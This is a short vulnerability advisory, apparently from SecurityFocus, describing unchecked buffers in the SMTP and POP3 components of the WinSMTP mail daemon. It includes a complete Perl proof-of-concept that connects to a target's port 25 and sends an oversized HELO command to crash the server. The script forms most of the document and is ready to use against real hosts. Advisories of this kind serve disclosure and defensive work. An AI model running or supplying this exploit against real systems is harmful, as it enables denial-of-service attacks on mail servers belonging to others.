source: http://www.securityfocus.com/bid/1680/info

A number of unchecked buffers exist in the SMTP and POP3 components of Jack De Winter's WinSMTP mail daemon which could lead to denial of service attacks or arbitrary code execution, depending on the data entered.

Sending a HELO command consisting of approximately 170 bytes or a USER command consisting of approximately 370 bytes will result in a Windows general protection fault error.

#!/usr/bin/perl
#
# ./$0.pl -s <server>
# sends data to stmpd, overflowing server buffer.
#
use Getopt::Std;
use IO::Socket;
getopts('s:', \%args);
if(!defined($args{s})){&usage;}
$serv = $args{s};
$foo = "A"; $number = 170; 
$data .= $foo x $number; $EOL="\015\012";
$remote = IO::Socket::INET->new(
		    Proto	=> "tcp",
		    PeerAddr	=> $args{s},
		    PeerPort	=> "smtp(25)",
		) || die("Unable to connect to smtp port at $args{s}\n");
$remote->autoflush(1);
print $remote "HELO $data". $EOL;
while (<$remote>){ print }

print("\nCrash was successful !\n");

sub usage {die("\n$0 -s <server>\n\n");}